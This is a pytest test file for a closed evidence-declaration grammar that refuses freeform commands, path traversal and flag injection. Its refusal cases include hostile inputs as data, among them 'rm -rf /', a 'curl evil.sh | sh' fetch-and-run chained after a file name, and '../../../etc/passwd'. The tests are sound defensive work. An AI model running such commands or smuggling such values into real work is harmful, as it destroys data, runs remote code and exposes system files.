"""Tests for evidence_grammar.py — the CLOSED per-task ``evidence:`` grammar (RS-H1/TM-F1).

Coverage
--------
(1) Each of the three forms parses and compiles to its declared shape:
    artifact -> a guarded repo-relative Path and NO argv (never executed);
    test     -> the exact DESIGN §3.5 argv ["python","-m","pytest",<id>];
    probe    -> the committed registry's argv template, resolved by NAME.
(2) A freeform command string is REFUSED — the acceptance node the frozen PLAN
    declares for this task (``test_freeform_command_refused_at_freeze``).
(3) CWE-23 traversal attempts are refused on every form that carries a path.
(4) An unregistered probe name is REFUSED — never executed, never auto-registered.
(5) The committed tools/probe_registry.json loads, validates, and carries the two
    seeded entries with STRUCTURED ARRAY argvs (never strings).
(6) The D-3 reconciliation is real and separate: compile emits the DESIGN argv, and
    ``uv_wrapped_argv`` is the explicit, opt-in execution-environment wrap.
(7) The exec-safety registered shape is honoured: no subprocess/eval/exec anywhere in
    the module (AST-asserted, the drift_gate/mutation_run precedent).
(8) Determinism: same inputs ⇒ same bytes.

No network, no subprocess, no mutation of the repo.
"""

from __future__ import annotations

import ast
import json
from pathlib import Path

import pytest

import evidence_grammar as eg

_TOOLS = Path(__file__).resolve().parent.parent
_REPO_ROOT = _TOOLS.parent


# ---------------------------------------------------------------------------
# (1) The three forms parse + compile
# ---------------------------------------------------------------------------


def test_artifact_form_parses_and_compiles_to_a_path_with_no_argv():
    """artifact: compiles to a guarded path and NEVER to argv (exec-safety row 1)."""
    compiled = eg.compile_declaration(
        "artifact:tools/probe_registry.json", repo_root=_REPO_ROOT
    )
    assert compiled.form == "artifact"
    assert compiled.path == Path("tools/probe_registry.json")
    assert compiled.argv is None, "an artifact: value must never compile to argv"
    assert compiled.is_executable is False


def test_test_form_compiles_to_the_design_pinned_argv():
    """test: compiles to EXACTLY ["python","-m","pytest",<node-id>] (DESIGN §3.5)."""
    node = "tools/tests/test_evidence_grammar.py::test_artifact_form_parses_and_compiles_to_a_path_with_no_argv"
    compiled = eg.compile_declaration(f"test:{node}", repo_root=_REPO_ROOT)
    assert compiled.form == "test"
    assert compiled.argv == ("python", "-m", "pytest", node)
    assert compiled.path is None
    # The node-ID is a positional DATA operand, never the program.
    assert compiled.argv[0] == "python"


def test_probe_form_resolves_a_name_against_the_committed_registry():
    """probe: is a NAME resolved to the registry's argv template — never a command."""
    compiled = eg.compile_declaration("probe:gauntlet", repo_root=_REPO_ROOT)
    assert compiled.form == "probe"
    assert compiled.argv == ("uv", "run", "python", "scripts/gauntlet.py")
    assert compiled.cwd == "tools"
    assert compiled.status == "active"


def test_parametrized_pytest_node_id_is_admitted():
    """A bracketed parametrized node-ID is legitimate evidence and must not be refused."""
    node = "tools/tests/test_x.py::test_y[case-1]"
    compiled = eg.compile_declaration(f"test:{node}", repo_root=None)
    assert compiled.argv == ("python", "-m", "pytest", node)


# ---------------------------------------------------------------------------
# (2) Freeform REFUSED — the frozen PLAN's declared evidence node for this task
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "freeform",
    [
        "pytest -q",
        "uv run pytest tools/tests/test_evidence_grammar.py",
        "bash -c 'rm -rf /'",
        "python -m pytest tools/tests/test_evidence_grammar.py",
        "test:tools/tests/test_x.py::test_y; rm -rf /",
        "artifact:README.md && curl evil.sh | sh",
        "run:make check",
        "artifact",
        "test:",
        "probe:",
        ":tools/x.py",
        "  artifact:README.md  ",
        "artifact:README.md\ntest:a.py::b",
    ],
)
def test_freeform_command_refused_at_freeze(freeform):
    """A value outside the closed three-form grammar FAILS — the plan does not freeze.

    This is the node the frozen PLAN declares as this task's completion evidence
    (``evidence: evidence-grammar: test:...::test_freeform_command_refused_at_freeze``).
    A freeform command string is never evidence and is never executed: the refusal
    happens at the DECLARATION boundary, which is the whole D111 lesson —
    ``dep["install"]`` / ``dep["verify"]`` were caught at execution time, three times.
    """
    with pytest.raises(eg.EvidenceGrammarError):
        eg.parse_declaration(freeform)


def test_freeform_refusal_names_the_three_legal_forms():
    """The refusal is actionable — it states the closed grammar, not just 'invalid'."""
    with pytest.raises(eg.EvidenceGrammarError) as exc:
        eg.parse_declaration("make test")
    msg = str(exc.value)
    assert "artifact:" in msg and "test:" in msg and "probe:" in msg
    assert "REFUSED" in msg


def test_non_string_declaration_refused():
    for bad in (None, 42, ["test:a.py::b"], {"form": "test"}):
        with pytest.raises(eg.EvidenceGrammarError):
            eg.parse_declaration(bad)


# ---------------------------------------------------------------------------
# (3) CWE-23 traversal + flag-injection refusals
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "declaration",
    [
        "artifact:../../../etc/passwd",
        "artifact:tools/../../outside.txt",
        "artifact:..",
        "test:../secrets/test_x.py::test_y",
        "test:tools/../../evil/test_x.py::test_y",
    ],
)
def test_traversal_attempts_refused_cwe23(declaration):
    """Any ``..`` component is refused on every path-carrying form (CWE-23)."""
    with pytest.raises(eg.EvidenceGrammarError, match="traversal"):
        eg.compile_declaration(declaration, repo_root=_REPO_ROOT)


def test_backslash_traversal_refused_on_every_platform():
    """``..\\..`` would survive a POSIX-only path split — the metachar sweep refuses it."""
    with pytest.raises(eg.EvidenceGrammarError):
        eg.compile_declaration(r"artifact:..\..\etc\passwd", repo_root=_REPO_ROOT)


@pytest.mark.parametrize(
    "declaration",
    [
        "test:-p/test_x.py::test_y",
        "artifact:-rf/tmp",
    ],
)
def test_leading_dash_segment_refused_flag_injection(declaration):
    """A leading ``-`` path segment reads as a pytest/CLI flag in an argv list."""
    with pytest.raises(eg.EvidenceGrammarError):
        eg.compile_declaration(declaration, repo_root=_REPO_ROOT)


@pytest.mark.parametrize(
    "declaration",
    [
        "test:tools/tests/test_x.py",          # no ::  -> not path::name shape
        "test:::test_y",                       # empty path part
        "test:tools/tests/test_x.py::",        # empty name part (caught by \\S+ / shape)
    ],
)
def test_malformed_node_ids_refused(declaration):
    with pytest.raises(eg.EvidenceGrammarError):
        eg.compile_declaration(declaration, repo_root=_REPO_ROOT)


def test_absolute_paths_refused():
    with pytest.raises(eg.EvidenceGrammarError):
        eg.compile_declaration("artifact:/etc/passwd", repo_root=_REPO_ROOT)


def test_drive_qualified_paths_refused_on_every_platform():
    """``C:/x`` is absolute on Windows and an ordinary relative dir on POSIX.

    Judging the same declaration differently per machine breaks the Determinism Doctrine
    before it breaks anything else, so both shapes are refused explicitly.
    """
    with pytest.raises(eg.EvidenceGrammarError, match="repo-relative"):
        eg.compile_declaration("artifact:C:/Windows/system32/x.txt", repo_root=None)
    with pytest.raises(eg.EvidenceGrammarError, match="repo-relative"):
        eg.compile_declaration("test:C:/x/test_y.py::test_z", repo_root=None)


def test_containment_layer_refuses_a_path_escaping_the_repo_root(tmp_path):
    """Resolved-containment is the defense-in-depth layer under the ``..`` check.

    Exercised directly because every declaration shape that reaches it in practice is
    already refused by an earlier guard — which is the point of layering, and worth
    pinning so a future refactor cannot delete the last layer unnoticed.
    """
    inner = tmp_path / "repo"
    inner.mkdir()
    eg._guard_contained("sub/file.txt", inner, what="artifact path")  # inside: no raise
    with pytest.raises(eg.EvidenceGrammarError, match="outside the repo root"):
        eg._guard_contained(Path(tmp_path / "elsewhere.txt"), inner, what="artifact path")


# ---------------------------------------------------------------------------
# (4) Unregistered probe REFUSED
# ---------------------------------------------------------------------------


def test_unknown_probe_name_refused_never_executed_never_autoregistered():
    with pytest.raises(eg.EvidenceGrammarError) as exc:
        eg.compile_declaration("probe:not-a-registered-probe", repo_root=_REPO_ROOT)
    msg = str(exc.value)
    assert "REFUSED" in msg
    assert "auto-registered" in msg
    # The known set is disclosed so the failure is actionable.
    assert "deny-tripwire" in msg and "gauntlet" in msg


def test_probe_value_that_looks_like_a_command_is_refused_as_a_name():
    """``probe:`` never accepts a command shape, even before registry lookup."""
    for bad in ("probe:uv/run/pytest", "probe:Gauntlet", "probe:-rf"):
        with pytest.raises(eg.EvidenceGrammarError):
            eg.compile_declaration(bad, repo_root=_REPO_ROOT)


def test_unknown_probe_refusal_does_not_depend_on_a_writable_registry(tmp_path):
    """Refusal is fail-closed: a missing registry raises, it never yields an empty pass."""
    with pytest.raises(eg.EvidenceGrammarError, match="cannot read"):
        eg.load_probe_registry(tmp_path / "absent.json")


# ---------------------------------------------------------------------------
# (5) The committed registry
# ---------------------------------------------------------------------------


def test_committed_registry_loads_and_carries_the_two_seeded_probes():
    entries = eg.load_probe_registry()
    assert set(entries) == {"deny-tripwire", "gauntlet"}
    assert entries["deny-tripwire"].status == "declared-before-active"
    assert entries["gauntlet"].status == "active"


def test_committed_registry_templates_are_structured_arrays_never_strings():
    raw = json.loads((_TOOLS / "probe_registry.json").read_text(encoding="utf-8"))
    for name, entry in raw["probes"].items():
        assert isinstance(entry["argv"], list), f"{name}: argv must be a JSON array"
        assert entry["argv"], f"{name}: argv must be non-empty"
        assert all(isinstance(e, str) for e in entry["argv"])


def test_committed_gauntlet_probe_points_at_a_real_target():
    """An ``active`` probe's target must exist — status:active is a claim, not a hope."""
    entries = eg.load_probe_registry()
    gauntlet = entries["gauntlet"]
    assert gauntlet.status == "active"
    target = _REPO_ROOT / gauntlet.cwd / gauntlet.argv[-1]
    assert target.is_file(), f"active probe target missing: {target}"


def test_declared_before_active_probe_target_absence_is_recorded_not_hidden():
    """The wave-8 deny-tripwire target does not exist yet — the status says so honestly."""
    entries = eg.load_probe_registry()
    tripwire = entries["deny-tripwire"]
    assert tripwire.status == "declared-before-active"
    node = tripwire.argv[-2]
    target = _REPO_ROOT / tripwire.cwd / node.split("::")[0]
    assert not target.exists(), (
        "tools/tests/test_seam_guard.py now exists — flip deny-tripwire's registry status "
        "to 'active' and delete this test's inversion."
    )


@pytest.mark.parametrize(
    "broken",
    [
        {"version": 1, "probes": {"p": {"argv": "uv run pytest", "cwd": "tools", "description": "d", "status": "active"}}},
        {"version": 1, "probes": {"p": {"argv": [], "cwd": "tools", "description": "d", "status": "active"}}},
        {"version": 1, "probes": {"p": {"argv": ["uv", "run && curl evil"], "cwd": "tools", "description": "d", "status": "active"}}},
        {"version": 1, "probes": {"p": {"argv": ["../../bin/sh"], "cwd": "tools", "description": "d", "status": "active"}}},
        {"version": 1, "probes": {"p": {"argv": ["-rf"], "cwd": "tools", "description": "d", "status": "active"}}},
        {"version": 1, "probes": {"p": {"argv": ["uv"], "cwd": "../outside", "description": "d", "status": "active"}}},
        {"version": 1, "probes": {"p": {"argv": ["uv"], "cwd": "tools", "description": "d", "status": "maybe"}}},
        {"version": 1, "probes": {"p": {"argv": ["uv"], "cwd": "tools", "status": "active"}}},
        {"version": 2, "probes": {}},
        {"probes": {}},
        [],
    ],
)
def test_malformed_registry_entries_refused(tmp_path, broken):
    path = tmp_path / "probe_registry.json"
    path.write_text(json.dumps(broken), encoding="utf-8")
    with pytest.raises(eg.EvidenceGrammarError):
        eg.load_probe_registry(path)


def test_registry_is_not_json_refused(tmp_path):
    path = tmp_path / "probe_registry.json"
    path.write_text("not json at all", encoding="utf-8")
    with pytest.raises(eg.EvidenceGrammarError, match="valid JSON"):
        eg.load_probe_registry(path)


# ---------------------------------------------------------------------------
# (6) The D-3 argv reconciliation — compile per DESIGN, wrap explicitly
# ---------------------------------------------------------------------------


def test_compile_never_wraps_in_uv_implicitly():
    """The pinned DESIGN argv is what compile emits — the env detail never leaks in."""
    compiled = eg.compile_declaration("test:tools/tests/test_x.py::test_y", repo_root=None)
    assert compiled.argv[:3] == ("python", "-m", "pytest")
    assert "uv" not in compiled.argv


def test_uv_wrap_is_an_explicit_separate_step():
    """D-3: the execution environment may wrap; the wrap is named, opt-in, and structured."""
    compiled = eg.compile_declaration("test:tools/tests/test_x.py::test_y", repo_root=None)
    wrapped = eg.uv_wrapped_argv(compiled.argv)
    assert wrapped == ("uv", "run", "python", "-m", "pytest", "tools/tests/test_x.py::test_y")
    # Still structured argv — the wrap never produces a command string.
    assert all(isinstance(e, str) for e in wrapped)


def test_module_contract_records_the_d3_reconciliation():
    """The reconciliation is recorded in the module contract, not just in a commit body."""
    doc = eg.__doc__ or ""
    assert "D-3" in doc
    assert "uv_wrapped_argv" in doc
    assert "[python, -m, pytest, <id>]" in doc


def test_module_contract_states_the_sibling_grammar_boundary():
    """mutation_run's grammar is a SIBLING (sink-side); this one is declaration-side."""
    doc = eg.__doc__ or ""
    assert "mutation_run" in doc
    assert "sink-side" in doc and "declaration-side" in doc


# ---------------------------------------------------------------------------
# (7) Exec-safety registered shape — nothing here executes anything
# ---------------------------------------------------------------------------


def test_module_spawns_nothing_and_never_evals():
    """AST proof of the registered contract: no subprocess import, no eval/exec, no shell."""
    tree = ast.parse((_TOOLS / "evidence_grammar.py").read_text(encoding="utf-8"))
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(a.name.split(".")[0] for a in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module.split(".")[0])
        elif isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            assert node.func.id not in {"eval", "exec", "compile"}, (
                f"evidence_grammar must never call {node.func.id}"
            )
        elif isinstance(node, ast.keyword) and node.arg == "shell":
            raise AssertionError("evidence_grammar must never pass a shell= kwarg")
    assert "subprocess" not in imported, "evidence_grammar spawns no subprocess, by contract"
    assert "os" not in imported


def test_no_compiled_form_carries_a_command_string():
    """There is no field a caller could hand to a shell — argv is a tuple of tokens."""
    for decl in (
        "artifact:tools/probe_registry.json",
        "test:tools/tests/test_x.py::test_y",
        "probe:gauntlet",
    ):
        compiled = eg.compile_declaration(decl, repo_root=_REPO_ROOT)
        assert compiled.argv is None or isinstance(compiled.argv, tuple)


def test_artifact_exists_is_the_only_artifact_consumer_and_never_runs_it():
    compiled = eg.compile_declaration("artifact:tools/probe_registry.json", repo_root=_REPO_ROOT)
    assert eg.artifact_exists(compiled, _REPO_ROOT) is True
    missing = eg.compile_declaration("artifact:tools/no_such_file.json", repo_root=_REPO_ROOT)
    assert eg.artifact_exists(missing, _REPO_ROOT) is False
    test_form = eg.compile_declaration("test:tools/tests/test_x.py::test_y", repo_root=None)
    with pytest.raises(eg.EvidenceGrammarError):
        eg.artifact_exists(test_form, _REPO_ROOT)


# ---------------------------------------------------------------------------
# (8) The plan-level check + determinism
# ---------------------------------------------------------------------------


def _tasks(*names):
    return set(names)


def test_check_evidence_map_accepts_a_well_formed_map():
    out = eg.check_evidence_map(
        {"a": ["artifact:README.md"], "b": ["test:tools/tests/test_x.py::test_y", "probe:gauntlet"]},
        _tasks("a", "b"),
        repo_root=_REPO_ROOT,
    )
    assert list(out) == ["a", "b"]          # sorted keys — deterministic map order
    assert out["b"][0].form == "test"
    assert out["b"][1].form == "probe"


def test_check_evidence_map_refuses_a_missing_declaration():
    with pytest.raises(eg.EvidenceGrammarError, match="no 'evidence:' declaration"):
        eg.check_evidence_map({"a": ["artifact:README.md"]}, _tasks("a", "b"))


def test_check_evidence_map_refuses_an_empty_declaration_list():
    with pytest.raises(eg.EvidenceGrammarError, match="no 'evidence:' declaration"):
        eg.check_evidence_map({"a": ["artifact:README.md"], "b": []}, _tasks("a", "b"))


def test_check_evidence_map_refuses_an_absent_map():
    with pytest.raises(eg.EvidenceGrammarError, match="no per-task 'evidence:'"):
        eg.check_evidence_map(None, _tasks("a"))


def test_check_evidence_map_refuses_an_orphan_key():
    """A mistyped evidence key silently leaves a REAL task undeclared."""
    with pytest.raises(eg.EvidenceGrammarError, match="not in the plan's task set"):
        eg.check_evidence_map(
            {"a": ["artifact:README.md"], "typo": ["artifact:README.md"]}, _tasks("a")
        )


def test_check_evidence_map_names_the_offending_task():
    with pytest.raises(eg.EvidenceGrammarError, match="'b'"):
        eg.check_evidence_map({"a": ["artifact:README.md"], "b": ["make test"]}, _tasks("a", "b"))


def test_check_evidence_map_refuses_a_bare_string_value():
    with pytest.raises(eg.EvidenceGrammarError, match="LIST of"):
        eg.check_evidence_map({"a": "artifact:README.md"}, _tasks("a"))


def test_determinism_same_inputs_same_bytes():
    """Determinism Doctrine: repeated compiles are byte-identical, order included."""
    payload = {
        "z": ["artifact:README.md"],
        "a": ["test:tools/tests/test_x.py::test_y", "probe:gauntlet"],
    }
    first = eg.check_evidence_map(payload, _tasks("a", "z"), repo_root=_REPO_ROOT)
    second = eg.check_evidence_map(payload, _tasks("a", "z"), repo_root=_REPO_ROOT)
    assert first == second
    assert list(first) == list(second) == ["a", "z"]
    argvs = [
        eg.compile_declaration(d, repo_root=_REPO_ROOT).argv
        for d in ("test:tools/tests/test_x.py::test_y", "probe:gauntlet")
    ]
    assert argvs == [
        eg.compile_declaration(d, repo_root=_REPO_ROOT).argv
        for d in ("test:tools/tests/test_x.py::test_y", "probe:gauntlet")
    ]


def test_registry_load_order_is_sorted_not_file_order(tmp_path):
    path = tmp_path / "probe_registry.json"
    path.write_text(
        json.dumps(
            {
                "version": 1,
                "probes": {
                    "zeta": {"argv": ["uv"], "cwd": "tools", "description": "d", "status": "active"},
                    "alpha": {"argv": ["uv"], "cwd": "tools", "description": "d", "status": "active"},
                },
            }
        ),
        encoding="utf-8",
    )
    assert list(eg.load_probe_registry(path)) == ["alpha", "zeta"]
